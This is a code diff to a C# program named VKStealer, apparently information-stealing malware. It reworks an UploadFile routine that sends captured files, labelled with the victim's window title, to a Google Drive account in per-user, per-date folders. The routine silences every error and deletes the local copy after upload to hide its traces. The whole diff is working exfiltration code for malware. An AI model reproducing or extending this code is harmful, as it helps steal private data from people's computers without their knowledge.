@@ -114,7 +114,7 @@ namespace VKStealer
                     }
                 }
             }
-            catch 
+            catch
             {
 
             }
@@ -240,46 +240,57 @@ namespace VKStealer
 
         private async void UploadFile(DriveService service, string fileName, string mimeType, string windowTitle)
         {
-            string folderVKStealerID = SearchFolder(service, "VKStealer_" + Environment.UserName);
+            string folderVKStealerID = SearchFolder(service, "VKStealer");
             if (folderVKStealerID == null)
             {
-                folderVKStealerID = CreateFolder(service, "VKStealer_" + Environment.UserName);
+                folderVKStealerID = CreateFolder(service, "VKStealer");
             }
-            string folderDateID = SearchFolder(service, DateTime.Now.ToShortDateString(), new string[] { folderVKStealerID });
-            if (folderDateID == null)
+            if (folderVKStealerID != null)
             {
-                folderDateID = CreateFolder(service, DateTime.Now.ToShortDateString(), new string[] { folderVKStealerID });
-            }
-            if (folderDateID != null)
-            {
-                File fileMetadata = new File()
+                string folderUserID = SearchFolder(service, Environment.UserName, new string[] { folderVKStealerID });
+                if (folderUserID == null)
                 {
-                    Title = fileName,
-                    Description = string.Format("Название окна: {0}", windowTitle),
-                    Parents = new List<ParentReference>()
+                    folderUserID = CreateFolder(service, Environment.UserName, new string[] { folderVKStealerID });
+                }
+                if (folderUserID != null)
+                {
+                    string folderDateID = SearchFolder(service, DateTime.Now.ToShortDateString(), new string[] { folderUserID });
+                    if (folderDateID == null)
                     {
-                        new ParentReference()
+                        folderDateID = CreateFolder(service, DateTime.Now.ToShortDateString(), new string[] { folderUserID });
+                    }
+                    if (folderDateID != null)
+                    {
+                        File fileMetadata = new File()
                         {
-                            Id = folderDateID
+                            Title = fileName,
+                            Description = string.Format("Название окна: {0}", windowTitle),
+                            Parents = new List<ParentReference>()
+                            {
+                                new ParentReference()
+                                {
+                                    Id = folderDateID
+                                }
+                            }
+                        };
+                        try
+                        {
+                            using (IO.FileStream stream = new IO.FileStream(fileName, IO.FileMode.Open))
+                            {
+                                FilesResource.InsertMediaUpload request = service.Files.Insert(fileMetadata, stream, mimeType);
+                                request.Fields = "id";
+                                await request.UploadAsync();
+                            }
+                        }
+                        catch
+                        {
+
+                        }
+                        finally
+                        {
+                            IO.File.Delete(fileName);
                         }
                     }
-                };
-                try
-                {
-                    using (IO.FileStream stream = new IO.FileStream(fileName, IO.FileMode.Open))
-                    {
-                        FilesResource.InsertMediaUpload request = service.Files.Insert(fileMetadata, stream, mimeType);
-                        request.Fields = "id";
-                        await request.UploadAsync();
-                    }
-                }
-                catch
-                {
-
-                }
-                finally
-                {
-                    IO.File.Delete(fileName);
                 }
             }
         }
